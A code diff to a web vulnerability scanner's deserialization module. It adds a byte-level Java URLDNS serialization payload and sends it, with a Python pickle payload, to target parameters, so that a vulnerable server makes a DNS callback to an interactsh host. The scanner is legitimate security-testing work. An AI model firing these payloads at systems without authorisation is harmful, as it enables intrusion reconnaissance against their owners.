@@ -1,6 +1,7 @@
 import base64
 import pickle
 import socket
+import struct
 
 from .base import BaseLightfuzz
 from bbot.errors import HttpCompareError
@@ -17,6 +18,90 @@ class _PickleOOB:
 
     def __reduce__(self):
         return (socket.gethostbyname, (self._callback_host,))
+
+
+def _java_utf(s):
+    """Encode a string with Java's 2-byte-length-prefixed modified UTF."""
+    b = s.encode("utf-8")
+    return struct.pack(">H", len(b)) + b
+
+
+def _build_java_urldns_payload(host):
+    """
+    Construct a Java URLDNS serialization payload targeting ``host``.
+
+    When deserialized by ObjectInputStream, HashMap.readObject rebuilds
+    its internal table by calling putVal(hash(key), key, value, ...),
+    and ``hash(key)`` invokes ``key.hashCode()``. Our key is a
+    java.net.URL with its stored hashCode field set to -1 (the "unset"
+    sentinel), so URL.hashCode() falls through to the stream handler's
+    hashCode(), which calls URL.getHostAddress(), which performs a DNS
+    lookup on ``host``. That lookup is observable via interactsh.
+
+    This works against ANY Java deserialization sink — no gadget-chain
+    class needs to be present in the target's classpath. Only
+    java.util.HashMap + java.net.URL are required, both in every JVM's
+    stdlib since 1.1.
+    """
+    buf = bytearray()
+    # STREAM_MAGIC + STREAM_VERSION=5
+    buf += b"\xac\xed\x00\x05"
+    # TC_OBJECT — HashMap instance
+    buf += b"\x73"
+    # TC_CLASSDESC — HashMap class descriptor
+    buf += b"\x72"
+    buf += _java_utf("java.util.HashMap")
+    # HashMap.serialVersionUID = 362498820763181265L
+    buf += struct.pack(">q", 362498820763181265)
+    # Flags: SC_SERIALIZABLE | SC_WRITE_METHOD
+    buf += b"\x03"
+    # Field count: loadFactor (float), threshold (int)
+    buf += struct.pack(">H", 2)
+    buf += b"F" + _java_utf("loadFactor")
+    buf += b"I" + _java_utf("threshold")
+    # TC_ENDBLOCKDATA (end of class annotations)
+    buf += b"\x78"
+    # Super class: TC_NULL
+    buf += b"\x70"
+    # Instance data: loadFactor=0.75, threshold=12
+    buf += struct.pack(">f", 0.75)
+    buf += struct.pack(">i", 12)
+    # Custom writeObject payload: TC_BLOCKDATA, length=8, capacity=16, size=1
+    buf += b"\x77\x08"
+    buf += struct.pack(">i", 16)
+    buf += struct.pack(">i", 1)
+
+    # Entry key: a java.net.URL with hashCode=-1
+    buf += b"\x73"  # TC_OBJECT
+    buf += b"\x72"  # TC_CLASSDESC
+    buf += _java_utf("java.net.URL")
+    # URL.serialVersionUID = -7627629688361524110L
+    buf += struct.pack(">q", -7627629688361524110)
+    # Flags: SC_SERIALIZABLE
+    buf += b"\x02"
+    # Field count: 7 (hashCode, port, authority, file, host, protocol, ref)
+    buf += struct.pack(">H", 7)
+    buf += b"I" + _java_utf("hashCode")
+    buf += b"I" + _java_utf("port")
+    for fname in ("authority", "file", "host", "protocol", "ref"):
+        buf += b"L" + _java_utf(fname)
+        # Field type: TC_STRING (0x74) + signature
+        buf += b"\x74" + _java_utf("Ljava/lang/String;")
+    buf += b"\x78"  # TC_ENDBLOCKDATA
+    buf += b"\x70"  # TC_NULL (super class)
+    # Instance data
+    buf += struct.pack(">i", -1)  # hashCode = -1 → forces DNS recomputation
+    buf += struct.pack(">i", 80)  # port
+    buf += b"\x74" + _java_utf(f"{host}:80")  # authority
+    buf += b"\x74" + _java_utf("")  # file
+    buf += b"\x74" + _java_utf(host)  # host
+    buf += b"\x74" + _java_utf("http")  # protocol
+    buf += b"\x70"  # ref: TC_NULL
+    # Entry value: TC_NULL (HashMap allows null values)
+    buf += b"\x70"
+    # TC_ENDBLOCKDATA closes HashMap's custom block
+    buf += b"\x78"
+    return bytes(buf)
 
 
 class serial(BaseLightfuzz):
@@ -276,16 +361,18 @@ class serial(BaseLightfuzz):
             r.pop("_technique", None)
             r.pop("_language", None)
 
-        # Blind RCE via Python pickle OOB. Payload generation is native to
-        # Python (unlike ysoserial-style Java/.NET gadgets that require
-        # out-of-process tooling), so we build the payload fresh with a
-        # unique interactsh subdomain each scan. A hit confirms not just
-        # "deserialization happens" but "attacker-controlled code ran".
+        # Blind RCE via language-native OOB payloads. Both pickle (Python)
+        # and URLDNS (Java) are built at scan time with a fresh interactsh
+        # subdomain — no out-of-process tooling required. Each uses its
+        # own subdomain tag so the interactsh callback unambiguously
+        # identifies which payload triggered.
         if self.lightfuzz.interactsh_instance:
             self.lightfuzz.event_dict[self.event.url] = self.event
-            subdomain_tag = self.lightfuzz.helpers.rand_string(4, digits=False)
-            callback_host = f"{subdomain_tag}.{self.lightfuzz.interactsh_domain}"
-            self.lightfuzz.interactsh_subdomain_tags[subdomain_tag] = {
+
+            # Python pickle OOB
+            pkl_tag = self.lightfuzz.helpers.rand_string(4, digits=False)
+            pkl_host = f"{pkl_tag}.{self.lightfuzz.interactsh_domain}"
+            self.lightfuzz.interactsh_subdomain_tags[pkl_tag] = {
                 "event": self.event,
                 "name": "Unsafe Deserialization",
                 "description": (
@@ -296,14 +383,39 @@ class serial(BaseLightfuzz):
                 "confidence": "CONFIRMED",
             }
             try:
-                pickle_oob_bytes = pickle.dumps(_PickleOOB(callback_host))
-                pickle_oob_b64 = base64.b64encode(pickle_oob_bytes).decode()
+                pkl_b64 = base64.b64encode(pickle.dumps(_PickleOOB(pkl_host))).decode()
             except Exception as e:
                 self.debug(f"failed to build pickle OOB payload: {e}")
             else:
                 await self.standard_probe(
                     self.event.data["type"],
                     cookies,
-                    pickle_oob_b64,
+                    pkl_b64,
+                    timeout=15,
+                )
+
+            # Java URLDNS OOB — fires on ANY Java deserialization sink;
+            # requires only java.util.HashMap + java.net.URL (stdlib).
+            java_tag = self.lightfuzz.helpers.rand_string(4, digits=False)
+            java_host = f"{java_tag}.{self.lightfuzz.interactsh_domain}"
+            self.lightfuzz.interactsh_subdomain_tags[java_tag] = {
+                "event": self.event,
+                "name": "Unsafe Deserialization",
+                "description": (
+                    f"Java URLDNS OOB (OOB Interaction) Type: [{self.event.data['type']}] "
+                    f"Parameter Name: [{self.event.data['name']}] Payload: [java_urldns_oob]"
+                ),
+                "severity": "CRITICAL",
+                "confidence": "CONFIRMED",
+            }
+            try:
+                java_b64 = base64.b64encode(_build_java_urldns_payload(java_host)).decode()
+            except Exception as e:
+                self.debug(f"failed to build Java URLDNS OOB payload: {e}")
+            else:
+                await self.standard_probe(
+                    self.event.data["type"],
+                    cookies,
+                    java_b64,
                     timeout=15,
                 )
